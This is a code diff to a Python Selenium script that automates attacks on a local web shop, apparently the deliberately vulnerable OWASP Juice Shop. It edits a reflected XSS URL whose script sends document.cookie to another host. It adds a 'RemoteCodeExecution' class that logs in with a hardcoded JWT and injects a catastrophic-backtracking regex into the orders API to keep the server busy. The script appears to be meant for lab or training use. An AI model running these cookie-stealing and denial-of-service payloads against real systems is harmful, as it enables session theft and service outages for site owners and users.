@@ -139,7 +139,7 @@ class XSSAttack(Attack):
         driver = webdriver.Chrome(options=self.chrome_options)
         driver.get(self.base_url)
         time.sleep(2)
-        attack_url = "http://localhost:3000/#/search?q=%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2F172.17.0.1%2F%22%2Bdocument.cookie%3B%3C%2Fscript%3E"
+        attack_url = "http://localhost:3000/#/search?q=%3Cscript%3Enew%20Image%28%29.src%3D%22http:%2F%2F127.0.0.1%2Fbogus.php?output=%29%22%2Bdocument.cookie%3B%3C%2Fscript%3E"
         driver.get(attack_url)
         time.sleep(2)
 
@@ -156,6 +156,51 @@ class SensitiveDataExposure(Attack):
         driver.get(self.base_url + exposed_file_path) 
         time.sleep(5)
 
+class RemoteCodeExecution(Attack):
+    """
+    Execute commands through api interface at /api-docs/#/Order/post_orders
+    Keep server busy using regex
+    Authorization token needed vor B2B Api
+    """
+    def __init__(self):
+        super().__init__()
+        self.token = """eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTgsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhZG1pbkB3ZWIuZGUiLCJwYXNzd29yZCI6IjQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkzIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0wNi0xNiAwNjozMjo0OS45MzkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0wNi0xNiAwNjozMjo0OS45MzkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNTkyMjg5MTcyLCJleHAiOjE1OTIzMDcxNzJ9.ff8RXTInNn4K7o1JzJbtgPwz_JI0vWBiVwFf1MOziyIu0esHpKSa1JQ9QciQMVc2OuaWmD3yPENDTglufO3oDhJbvi9lCMLWgY8SjYYzrlsuOjqGSPyOJS8yzDc_1Svh-0BJ_UXIif_w3uzfC282WKXgXPr3RJRxBJ5zjLcfzc8"""
+        self.code = """{"orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}"""
+
+    def run(self, token=None, code=None):
+        if token == None:
+            token = self.token
+        if code == None:
+            code = self.code
+        driver = webdriver.Chrome(options=self.chrome_options)
+        time.sleep(2)
+        driver.get(self.base_url + "/api-docs/#/Order/post_orders")
+        time.sleep(3)
+        # Enter Authorization Bearer   
+        # open form to be able to print token
+        driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/button").click()
+        token_input = driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/div/div[2]/div/div/div[2]/div/form/div[1]/div[2]/section/input")
+        token_input.send_keys(token)
+        time.sleep(20)
+        # confirm authorization
+        driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/div/div[2]/div/div/div[2]/div/form/div[2]/button[1]").click()
+        time.sleep(2)
+        # close form
+        driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/div/div[2]/div/div/div[2]/div/form/div[2]/button[2]").click()
+        time.sleep(2)
+        # click try it out button to be able to enter test code
+        driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[4]/section/div/span/div/div/span/div/div[2]/div/div[2]/div[1]/div[2]/button").click()
+        time.sleep(5)
+        # remove example input
+        payload_input = driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[4]/section/div/span/div/div/span/div/div[2]/div/div[2]/div[3]/div[2]/div/div[2]/div/textarea")
+        payload_input.clear()
+        time.sleep(2)
+        # send own code payload 
+        payload_input.send_keys(code)
+        # execute malicious payload
+        driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[4]/section/div/span/div/div/span/div/div[2]/div/div[3]/button").click()
+        time.sleep(10)
+
 class TwoFactor:
     """
     Steps to attack 2FA:
@@ -163,4 +208,6 @@ class TwoFactor:
     """
     def run():
         pass
+
+
 
